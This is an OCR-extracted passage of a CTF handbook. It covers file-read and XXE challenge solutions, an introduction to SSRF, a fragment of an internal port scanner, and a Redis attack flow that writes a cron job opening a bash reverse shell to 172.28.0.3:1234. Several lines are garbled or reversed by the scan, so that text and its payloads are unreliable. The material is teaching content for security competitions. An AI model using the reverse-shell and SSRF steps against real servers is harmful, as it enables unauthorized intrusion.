---
## Page 95
1.3 Arbitrary File Read Vulnerability
Ok, you get the first part of flag : 5bdd3bobalfcb4 0
#youw111neverlcnovth1sfi1e_e2cd3614b63ccdcbfe7c8f073 76fe431
then you can do more to get more part of flag
Then you could search for the other half of the flag and fail. Then guessed that the
other half of the flag is in the intranet, so you could read /etc/host and /proc/net/arp to
get the intranet IP: 192.168.223.18.
Exploiting the XXE vulnerability to access port 80 of 192.168.223.18 (you can
OS pue s qm e (u sod uou  ssns isn uos pod e op ose
injection is found on the 192.168.223.18 host. Use the blind injection to get the other
half of the flag.
, 4uT s ALIIa1>
(casea0when ((1) 1ike (1)) then (0) else (1) end) -*1*>
xxe_1oca1=↓pay1oad;  >>
$int;
$trick;
【Summary】 This challenge examines the file reading and utilization method of
 jo usx X  q pons pood   X dH
no os Saosp rn pood dHd o sueau dHd up oq eu sotenue
can use the Base64 Filter to encode the content of the file to avoid truncating the
Blind XXE due to special characters such as *&* and " Fi1e names cannot have *...' ) ;
【Difficulty 】 Easy.
[Knowledge】 File reading vulnerabilities.
[Challenge solving 】 Find the web directory by reading the Apache configuration
file. See Fig. 1.96.
Once the web directory is known, you can construct the absolute path of the flag
file diretly from the web directory tobypasstherelative path restrictin andread the
flag, see Fig. 1.97.
【Summary 】 This is a classic file reading challenge. It mainly examines the ability
of players to collect information on Web configuration files. You need to find Web
directories by reading Apache configuration files. By constructing absolute paths,
you can bypass the restrictions of relative paths to get the flag file.
X+
/div
CATP/
VLrts
de so   e it si  
ServerAdsis websasterolocathost
cumentRoot /Th35_1s TAT tHe PL4se_Yow_NSVSR_KaoN/var/ww/htel
 It is aiso posible to confleure the loglevel for particular
Fig, 1.96 Find the web directory by reading the Apache configuration file
---
## Page 98
82
1 Introduction to the Web
C
UuCTF(ven_You_Wta_You_FLnd_Me_NOw)
Fig, 1.97 get flag
1.4 Summary
Among CTF°s Web challenges, information collection, SQL injection, and arbitrary
file reading vulnerabilities are the most common and basic vulnerabilities. When
encountering web-type challenges in the competition, we can first determine whether
the above-mentioned web vulnerabilities are contained in the challenge and com-
plete the challenge.
Chapters 2 and 3 will introduce other common  vulnerabilities from the
"advanced* and *extended" levels involved in web challenges. The web vulnerabil-
ities involved in the “advanced* level require readers to have a certain foundation
and experience. The “level" involves more complex vulnerabilities and technical
points; the *expansion" level involves more features related to Web challenges, such
as Python security issues.
---
## Page 99
Chapter2
L
AdvancedWeb
Through the study of Chap. 1, you may have a basic understanding of Web
challenges. However, in actual competitions, the challenges are often composed of
multiple vulnerabilities, and the Web vulnerabilities mentioned in Chap. 1 are often
the introductory part of some complex challenges. For example, the back-end system
password is obtained through SQL injection, and there are upload vulnerabilities in
the back-end system. How to bypass uploading Webshell to get the flag becomes
the key-
This chapter will introduce readers to four kinds of Web vulnerabilities with
various exploit techniques and high frequency of competitions: SSRF vulnerabil-
ities, command execution vulnerabilities, XSS vulnerabilities, and file upload vul-
nerabilities. I hope readers can think about how to find “advanced” vulnerabilities
-depo s o ssaud suuea o u sqeaana _onpnu, uaaosp ae
ter. Understanding the causes and consequences of such vulnerabilities can we better
understand these “advanced" vulnerabilities. Such connection and combination also
contribute to the formation of ideas for solving Web challenges.
2.1SSRF Vulnerabilities
SSRF (Server Side Request Forgery) is a vulnerability that allows an attacker to
-n apeugo ssanbau asnesog indu Suonnsuoo q isanbau apis-iaaas e otnoj
nally, SSRF vulnerabilities generally target internal systems inaccessible from
outside the network.
SSRF vulnerabilities are often caused because the server-side can retrieve data
from external services but does not filter and restrict essential parameters such as
target addresses and protocols, which allows an attacker to construct parameters and
initiate unanticipated requests freely.
C The Author(s), under exclusive license to Springer Nature Singapore Pte Ltd. 2022
NulL Team, Handbook for CTFers,
G
htps:/doi.crg/10.1007/978.981-19-0336-6_2
---
## Page 100
8
qM peourapV 7
2.1.1SSRF Principle Analysis
The structure of the URL is as follows.
URI = scheme : [/ /authority]path [7query] [#fragment]
The authority component is divided into the following three parts (see Fig. 2.1).
[userinfoe]host [:port]
A scheme consists of a string of case-insensitive characters that represent the
protocol required to obtain a resource.
In authority, userinfo is less frequently encountered. It is an option, but HTTP
generally uses anonymous forms to retrieve data, and if authentication is required,
the format is usermame:password, ending with @.
The host indicates the server on which the resource is accessed, usually seen in
the form of domain names, such as baidu.com, but also the form of IPv4, IPv6
addresses.
The port is the server port. Each protocol has a default port, such as 80 for HTTP
and 21 for FTP.
The path is the path to the resource, usually using “/" for hierarchy.
denoted by ? * as a representation. For example, the username and password passed
A query is a query string that the user passes to the server as user input data,
to the server is *?usermame=axdmin&passwordadmin123".
A fragment is a fragment ID that, unlike a query, is not passed to the server and is
ed e uo jupod soqpue ue puasaudau o1 pasn  0:
print ip, port, 'is open'
except :
continue
print 'DONE'
The results of the run are shown in Fig. 2.5.
---
## Page 104
88
qPM peouapy 
Fig, 2.5 Result
pythonscan.py
192.168.80.26379isopen
192.168.80.33306isopen
192.168.80.480isopen
192.168.80.5 80 is open
DONE
2.1.3.2 Extending the Attack Surface Using the Gopher Protocol
1. Attack Redis
Redis generally runs on an intranet, and most users bind it to 127.0.0.1:6379, which
is generally empty. An attacker who gains unauthorized access to Redis through an
SSRF vulnerability may be able to add, check, delete, or change the contents of
Redis, or even write to Crontab, Webshell, and SSH public keys using the export
function (the owner of the file written using the export function is the startup user of 
Redis, who is generally root, and will not be able to do so if the startup user has low
privileges). (Attack).
If one instruction is wrong, it will read the next one, so if you can control one of
the lines in the message you send, you can modify it to a Redis instruction and
execute the instruction in batches to complete the attack. If you can control multiple
lines of messages, then you can complete the attack in a single connection.
In an attack on Redis, typically a write to Crontab bounce shell, the usual attack
flow is as follows.
redis-cli flusha11
echo -e *,n\,n^n*/1 + + + + bash -1 /dev/tcp/172 . 28 . 0 3/1234 0>&1\n\,na|
redis-c1i config set dir /vax/spoo1/cron/
redis-cli -x set 1
redis-cli config set dbfilename root
redis-cli save
At this point, we use socat to retrieve the packet with the following command.
scoat -v tcp-1isten:1234, fork tcp-connect : 1oca1host : 6379
Forwarding the local port 1234 to port 6379 and then executing the instructions of
the attack process, in turn, will yield the attack data, see Fig. 2.6.
Then, convert the data into Gopher protocol URLs by discarding the data starting
with °> and °<”, which indicate the request and the retum, and discarding the +OK
data, which indicates the retum message. In the remaining data, replace “r” with “%
---